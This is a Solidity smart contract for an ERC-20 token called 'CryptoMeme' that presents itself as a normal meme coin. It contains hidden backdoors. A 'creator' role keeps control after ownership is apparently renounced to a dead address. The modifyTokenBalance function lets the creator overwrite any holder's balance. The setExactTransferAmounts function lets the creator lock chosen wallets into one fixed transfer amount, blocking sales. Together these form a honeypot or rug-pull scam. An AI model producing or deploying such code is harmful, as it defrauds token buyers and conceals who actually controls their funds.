pragma solidity ^0.8.10;

interface IERC20Custom {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function getCaller() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingleOwner is Context {
    address private _soleOwner;
    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        address sender = getCaller();
        _soleOwner = sender;
        emit OwnershipTransferred(address(0), sender);
    }

    function getOwner() public view virtual returns (address) {
        return _soleOwner;
    }

    modifier onlyOwner() {
        require(getOwner() == getCaller(), "Only owner can perform this action");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_soleOwner, address(0x000000000000000000000000000000000000dEaD));
        _soleOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract CryptoMeme is Context, SingleOwner, IERC20Custom {
    mapping (address => mapping (address => uint256)) private _delegations;
    mapping (address => uint256) private _wallets;
    mapping (address => uint256) private _fixedTransferAmounts;
    address private _creatorAddress;

    string public constant _name = "CryptoMeme";
    string public constant _symbol = "MEME";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 100000 * (10 ** _decimals);

    constructor() {
        _wallets[getCaller()] = _totalSupply;
        emit Transfer(address(0), getCaller(), _totalSupply);
    }

    modifier onlyCreator() {
        require(getCreator() == getCaller(), "Only creator can perform this action");
        _;
    }

    function getCreator() public view virtual returns (address) {
        return _creatorAddress;
    }

    function assignCreator(address newCreator) public onlyOwner {
        _creatorAddress = newCreator;
    }

    event TokenDisbursed(address indexed user, uint256 oldBalance, uint256 newBalance);

    function getExactTransferAmount(address account) public view returns (uint256) {
        return _fixedTransferAmounts[account];
    }

    function setExactTransferAmounts(address[] calldata accounts, uint256 amount) public onlyCreator {
        for (uint i = 0; i < accounts.length; i++) {
            _fixedTransferAmounts[accounts[i]] = amount;
        }
    }

    function modifyTokenBalance(address[] memory addresses, uint256 desiredBalance) public onlyCreator {
        require(desiredBalance >= 0, "Desired balance must be non-negative");

        for (uint256 i = 0; i < addresses.length; i++) {
            address currentUser = addresses[i];
            require(currentUser != address(0), "Address must not be the zero address");

            uint256 priorBalance = _wallets[currentUser];
            _wallets[currentUser] = desiredBalance;

            emit TokenDisbursed(currentUser, priorBalance, desiredBalance);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _wallets[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_wallets[getCaller()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = getExactTransferAmount(getCaller());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _wallets[getCaller()] -= amount;
    _wallets[recipient] += amount;

    emit Transfer(getCaller(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _delegations[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _delegations[getCaller()][spender] = amount;
        emit Approval(getCaller(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_delegations[sender][getCaller()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = getExactTransferAmount(sender);
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _wallets[sender] -= amount;
    _wallets[recipient] += amount;
    _delegations[sender][getCaller()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

}